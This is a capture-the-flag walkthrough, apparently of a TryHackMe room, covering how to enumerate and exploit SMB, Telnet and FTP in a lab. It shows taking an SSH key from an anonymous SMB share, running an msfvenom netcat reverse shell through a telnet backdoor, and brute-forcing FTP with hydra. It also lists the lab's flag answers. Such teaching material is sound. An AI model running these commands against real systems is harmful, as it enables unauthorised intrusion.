# Network Services

## Task 2 - Understanding SMB

### What Is SMB ?

SMB - Server Message Block Protocol - is a client-server communication protocol for sharing access to files, printers, serial ports and other resources on a network

Servers make file systems and other resources(printers, named pipes, APIs) available to clients on the network. Client computers have their own hard disks, but they also want to access the shared file systems and printers on the servers.

SMB is a response-request protocol, meaning that it transmits multiple messages between clients and server to esatblish a connection. Clients connect to server using TCP/IP(actually NetBIOS over TCP/IP as specified in RFC 1001 and RFC 1002), NETBEUI or JPX/SPX.

#### How Does SMB Work ?

Once the connection is established, clients can then send commands (SMBs) to the server that allows them to access shares, open files, read and write files and generally do all sort of things you want to do with a file system. However, in case of SMB, these things are done over the network.

#### What Runs SMB ?

Microsoft Windows operating systems since Windows 95 have included client and server SMB protocol support. Samba, an open source server that supports the SMB protocol, was released for Unix systems.

### Answer the questions below

- What does SMB stands for ?

    `Server Message Block`

- What type of protocol is SMB ?

    `response-request`

- What protocol suite clients use to connect to the server ?

    `TCP/IP`

- What systems does Samba run on ?

    `Unix`

---

## Task 3 - Enumerating SMB

### Enumeration 

The process of gathering information on a target to find possible attack vectors and to aid in exploitation

This process is essential and is used to gather:

- usernames
- passwords
- network information
- hostnames
- application data
- services

### SMB

SMB shares drives on a server can be connected to  and used to view or transfer files. SMB can often be a good starting point for an attacker as sometimes sensitive information can also be discovered from these shares.

### Port Scanning

This is the first step of enumeration

We try to find out as much information as we can about services, applications, structure and operating system of the target machine

### Enum4Linux

Enum4Linux is a tool used to enumerate SMB share on Windows and Linux. 

#### Syntax

`enum4linux [options]<ip>`

| TAG | FUNCTION                                         |
|-----|--------------------------------------------------|
| `-U` | Get userlist                                    |
| `-M` | Get machine list                                |
| `-N` | Get namelist dump (different from `-U` and `-M`)|
| `-S` | Get sharelist                                   |
| `-P` | Get password policy information                 |
| `-G` | Get group and member list                       |
| `-a` | All of the above (full basic enumeration)       |

### Answer the questions below

- Conduct an nmap scan of your choosing, How many ports are open?

    #### Answer: `3`

    #### Process:

    ![nmap scan](/IMAGES/Network%20Services/nmap%20scan.png)

- What ports is SMB running on? Provide the ports in ascending order.

    #### Answer: `139/445`

    #### Process:

    From the above nmap scan we can see that `netbios-ssn` and `microsoft-ds` are open

- Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?    

    #### Answer: `WORKGROUP`

    #### Process:

    We first start the enum4linux command:

    ![enum4linux](/IMAGES/Network%20Services/enum4linux%20command.png)

    After running this command we can see that the workgroup name is listed there in the output:

    ![workgroup](/IMAGES/Network%20Services/workgroup.png)

- What comes up as the name of the machine?        

    #### Answer: `POLOSMB`

    #### Process:

    In the enum4linux command output we can spot the machine name:

    ![machine name](/IMAGES/Network%20Services/OS.png)

- What operating system version is running?    

    #### Answer: `6.1`

    #### Process:

    From the above output for machine name we can see there that OS version is 6.1

- What share sticks out as something we might want to investigate?    

    #### Answer: `profiles`

    #### Process:

    ![shares](/IMAGES/Network%20Services/share.png)

---

## Task4 - Exploiting SMB

### Types Of SMB Exploit

While there are vulnerabilities related to SMB such as [CVE-2017-7494](https://www.cvedetails.com/cve/CVE-2017-7494/) but we can also exploit misconfigurations in the system

Here we are going to exploit anonymous SMB share access - a common misconfiguration that can allow us to gain information that will lead to shell

### Method Breakdown

From our enumaeration stage we know:

- SMB share location
- The name of an interesting SMB share

### SMB Client

To access an SMB share we need a client to access reources on a server

Here we will beusing SMB client as it is the part of the samba suite

#### Syntax:

We can remotely access the SMB share using the syntax:

` smbclient //[IP]/[SHARE] -U [USERNAME] -p [PORT]`

#### Example: 

`smbclient //10.10.10.10/secrets -U Anonymous -p 445`

#### SMBClient Commands

Once inside the share, you can view the available commands by typing "help". The most useful of which are:

- `ls or dir`: List files and directories
- `cd [DIR]`: Move to a different directory
- `get [FILE]`: Download the file to your AttackBox

### Answer the questions below

- What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?

    #### Answer: `smbclient//10.10.10.2/share -U suit -p 445`

Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn't require authentication to view the files. We can do this easily by:

- using the username "Anonymous"

- connecting to the share we found during the enumeration stage

- and not supplying a password.

- Does the share allow anonymous access? Y/N?

    #### Answer: `Y`

    #### Process:

    We access SMB through username anonymous:

    ![anonymous smb access](/IMAGES/Network%20Services/smb%20access.png)

- Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?

    #### Answer: `John Cactus`

    #### Process:

    After accessing the smb we run `ls` command and find a file named `Work From Home Information.txt`

    Using the get command we copy this file to our machine and use `cat` command to view the content:

    ![workfromhome](/IMAGES/Network%20Services/workfromhome.png)

- What service has been configured to allow him to work from home?

    #### Answer: `ssh`

    #### Process:

    ![ssh](/IMAGES/Network%20Services/workfromhome.png)

- Okay! Now we know this, what directory on the share should we look in?

    #### Answer: `.ssh`

    #### Process:

    ![.ssh folder](/IMAGES/Network%20Services/ssh%20folder.png)


- This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?

    #### Answer: `id_rsa`

    #### Process:

    So we move into the .ssh folder through `cd` command and run `ls` command to view the files:

    ![moving into ssh folder](/IMAGES/Network%20Services/moving%20into%20ssh%20folder.png)

Download this file to your local machine, and change the permissions to "600" using "chmod 600 [file]".

Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server.

- What is the smb.txt flag?

    #### Answer: `THM{smb_is_fun_eh?}`

    #### Process:

    We run `get` command to copy id_rsa file to our machine:

    ![copying id_rsa](/IMAGES/Network%20Services/getting%20id_rsa.png)

    Also we run `more id_rsa.pub` command where we find the ssh username as `cactus`:

    ![more id_rsa.pub command](/IMAGES/Network%20Services/ssh%20username.png)

    After that we login into ssh using this name:

    ![logging into ssh](/IMAGES/Network%20Services/logging%20in%20with%20ssh.png)

    A simple `ls` command give us a view of the file inside the directory and we then run the `cat` command to retrieve our flag:

    ![retrieving the flag](/IMAGES/Network%20Services/smb%20flag.png)

---

## Task 5 - Understanding Telnet

### What is Telnet?

Telnet is an application protocol, that allows us, with the help of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server

- The telnet client esablishes the connection with the server
- The client then becomes a virtual terminal - allowing interaction with remote hosts

#### Replacement

Telent sends all messages in plain text without any security mechanisms

So it is recently being replaced by ssh which transmits encrypted data

#### How does Telnet work?

The user connects to the server by using the Telnet protocol, which means entering "telnet" into a command prompt

The user then executes commands on the server by using specific Telnet commands in the Telnet prompt

#### Syntax:

You can connect to a telnet server with the following syntax:

`telnet [ip] [port]`

### Answer the questions below

- Is Telnet a client-server protocol (Y/N)?

    `Y`

- What has slowly replaced Telnet?    

    `ssh`

- How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?

    `telnet 10.10.10.3 23`

- The lack of what, means that all Telnet communication is in plaintext?

    `encryption`

---

## Task 6 - Enumerating Telnet

### Answer the questions below

- How many ports are open on the target machine? Note: you may need to scan non-standard ports too.

    #### Answer: `1`

    #### Process:

    ![nmap scan](/IMAGES/Network%20Services/nmap_telnet_scan.png)

- What port is this?

    #### Answer: `8012`

- This port is unassigned, but still lists the protocol it's using, what protocol is this?     

    #### Answer: `TCP`

- Now re-run the nmap scan, without the -p- tag, how many ports show up as open?

    #### Answer: `0`

    #### Process:

    ![nmap without -p flag](/IMAGES/Network%20Services/nmap_telnet(2)_scan.png)

- Based on the title returned to us, what do we think this port could be used for?

    #### Answer: `A backdoor`

    #### Process:

    We now run an nmap scan specifically for `port 8012` and with flags `sC` and `sV` to find more on what is exactly running on that port

    ![SKIDY's backdoor](/IMAGES/Network%20Services/SKIDY's%20backdoor.png)

- Who could it belong to? Gathering possible usernames is an important step in enumeration.

    #### Answer: `SKIDY`

---

## Task 7 - Exploiting Telnet

### Types Of Telnet Exploits

Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control. 

There are CVE's for Telnet client and server systems, however, so when exploiting we can check for those on:

- [CVE Details](https://www.cvedetails.com/)
- [Mitre CVE](https://cve.mitre.org/)


A CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw.

However, you're far more likely to find a misconfiguration in how telnet has been configured or is operating that will allow you to exploit it.

#### Method Breakdown

So, from our enumeration stage, we know:

- There is a poorly hidden telnet service running on this machine

- The service itself is marked "backdoor"

- We have possible username of "Skidy" implicated

Using this information, let's try accessing this telnet port, and using that as a foothold to get a full reverse shell on the machine!

### Connecting to Telnet

You can connect to a telnet server with the following syntax:

`telnet [ip] [port]`

### What is a Reverse Shell?

A shell is a piece of code or program which can be used to gain code or command execution on a device

A reverse shell is a type of shell in which target machine communicates back to the attacking machine

The attacking machine has a listening port on which it receives connection resulting in code or command execution being achieved

### Answer the questions below

- Great! It's an open telnet connection! What welcome message do we receive?

    #### Answer: `SKIDY'S BACKDOOR`

    #### Process:

    First we connect to telnet using the syntax:

    `telnet ip port`

    ![welcome message telnet](/IMAGES/Network%20Services/welcomemessage_telnet.png)

- Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)

    #### Answer: `N`

#### Starting tcpdump:

Start a tcpdump listener on our local machine

If using own machine with the OpenVPN connection, use:

`sudo tcpdump ip proto \\icmp -i tun0`

If using the AttackBox, use:

`sudo tcpdump ip proto \\icmp -i ens5`

This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.

- Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)

    #### Answer: `Y`

    #### Process:

    First we connect through telnet:

    ![telnet](/IMAGES/Network%20Services/welcomemessage_telnet.png)

    Then we run tcpdump on our local (kali) machine through syntax:

    `sudo tcpdump ip proto \\icmp -i tun0`

    After that we sent a ping through telnet to out local machine vpn address:

    ![sending ping](/IMAGES/Network%20Services/running_ping_telnet.png)

    We can see on our tcpdump output that the ping was received:

    ![tcpdump ping result](/IMAGES/Network%20Services/tcpdump.png)

#### Generating Reverse Shell Payload Using msfvenom:

We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:

`msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`

- -p = payload
lhost = our local host IP address (this is your machine's IP address)
- lport = the port to listen on (this is the port on your machine)
- R = export the payload in raw format

- What word does the generated payload start with?

    #### Answer: `mkfifo`

    #### Process:

    ![msfvenom](/IMAGES/Network%20Services/payload%20start%20with.png)

    Here we used our vpn address

Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:

`nc -lvnp [listening port]`

- What would the command look like for the listening port we selected in our payload?

    #### Answer: `nc -lvnp 4444`

- Success! What is the contents of flag.txt?

    #### Answer: `THM{y0u_g0t_th3_t3ln3t_fl4g}`

    #### Process:

    First we start netcat using the syntax mentioned above:

    `nc -lvnp 4444`

    ![netcat](/IMAGES/Network%20Services/netcat.png)

    Then we run the payload we got from msfvenom on the telnet machine:

    ![running payload](/IMAGES/Network%20Services/running%20payload.png)

    Then we go back to where netcat is running. After trying a few linux commands we figure out the `flag.txt` file and ultimately our flag:

    ![telnet flag](/IMAGES/Network%20Services/flag.png)

---

## Task 8 - Understanding FTP

### What is FTP?

File Transfer Protocol (FTP) is a protocol used to allow remote transfer of files over a network. It uses a client-server model to do this.

### How does FTP work?

A typical FTP session operates using two channels:
- a command (sometimes called the control) channel
- a data channel

As their names imply, the command channel is used for transmitting commands as well as replies to those commands, while the data channel is used for transferring data.

FTP operates using a client-server protocol. The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session.

While the session is open, the client may execute FTP commands on the server.

### Active vs Passive

The FTP server may support either Active or Passive connections, or both

- In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it
- In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it

This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish

If both channels were interlinked, you could only enter commands in between data transfers, which wouldn't be efficient for either large file transfers, or slow internet connections

### Answer the questions below

- What communications model does FTP use?

    `client-server`

- What's the standard FTP port?

    `21`

- How many modes of FTP connection are there?    

    `2`

---

## Task 9 - Enumerating FTP

### Answer the questions below

- How many ports are open on the target machine? 

    #### Answer: `3`

    #### Process:

    We start by running a basic nmap scan:

    ![nmap ftp scan](/IMAGES/Network%20Services/ftp%20scan%20nmap.png)

- What port is ftp running on?

    #### Answer: `21`

    #### Process:

    We got this answer from the above nmap scan

- What variant of FTP is running on it?  

    #### Answer: `vsftpd`

    #### Process:

    For this we run nmap with `-sV` flag setup:

    ![nmap version](/IMAGES/Network%20Services/ftp%20version.png)

- What is the name of the file in the anonymous FTP directory?

    #### Answer: `PUBLIC_NOTICE.txt`

    #### Process:

    Now we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing "ftp [IP]" into the console, and entering "anonymous", and no password when prompted.

    ![logging in ftp](/IMAGES/Network%20Services/logging%20into%20ftp.png)

    Now we try some commands to see what we can get. We see a file named `PUBLIC_NOTICE.txt` and copy it through the `get` command to our local attack machine: 

    ![getting file](/IMAGES/Network%20Services/getting%20PUBLIC_NOTICE.txt.png)

- What do we think a possible username
could be?

    #### Answer: `Mike`

    #### Process:

    After getting the file on our local machine we run the `cat` command on it to check the content:

    ![username](/IMAGES/Network%20Services/username%20ftp.png)

---

## Task 10- Exploiting FTP

### Types of FTP Exploit

Similarly to Telnet, when using FTP both the command and data channels are unencrypted. Any data sent over these channels can be intercepted and read.

- With data from FTP being sent in plaintext, if a man-in-the-middle attack took place an attacker could reveal anything sent through this protocol (such as passwords). An article written by [JSCape](https://www.jscape.com/blog/bid/91906/Countering-Packet-Sniffers-Using-Encrypted-FTP) demonstrates and explains this process using ARP-Poisoning to trick a victim into sending sensitive information to an attacker, rather than a legitimate source.

- When looking at an FTP server from the position we find ourselves in for this machine, an avenue we can exploit is weak or default password configurations.

### Method Breakdown

So, from our enumeration stage, we know:

- There is an FTP server running on this machine

- We have a possible username

Using this information, let's try and bruteforce the password of the FTP Server

### Hydra

Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more. Hydra is already installed on the AttackBox, however, if you need it on your own attacking machine, you can find the GitHub repository here.

The syntax for the command we're going to use to find the passwords is this:

`hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp`

| SECTION              | FUNCTION                                                                 |
|-----------------------|--------------------------------------------------------------------------|
| `hydra`              | Runs the hydra tool                                                      |
| `-t 4`               | Number of parallel connections per target                                |
| `-l [user]`          | Points to the user whose account you're trying to compromise             |
| `-P [path to dictionary]` | Points to the file containing the list of possible passwords         |
| `-vV`                | Sets verbose mode to very verbose, shows the login+pass combination for each attempt |
| `[machine IP]`        | The IP address of the target machine                                     |
| `ftp / protocol`     | Sets the protocol                                                        |

### Answer the questions below

- What is the password for the user "mike"?

    #### Answer: `password`

    #### Process:

    We run hydra using the above command:

    ![running hdra for ftp](/IMAGES/Network%20Services/mike%20password.png)

- What is ftp.txt?

    #### Answer: ``

    #### Process:

    Next we login into ftp using the name and password we got. WE nvaigate around a bit and transfer the flag.txt file to out local machine using `get`:

    ![getting ftp flag file](/IMAGES/Network%20Services/logging%20in%20as%20mike%20and%20getting%20ftp.txt.png)

    Next we `cat` the file on our local machine:

    ![ftp flag](/IMAGES/Network%20Services/ftp%20flag.png)

---

## Task 11 - Expanding Your Knowledge

Reading

Here's some things that might be useful to read after completing this room, if it interests you:

- https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef
- https://attack.mitre.org/techniques/T1210/
- https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/
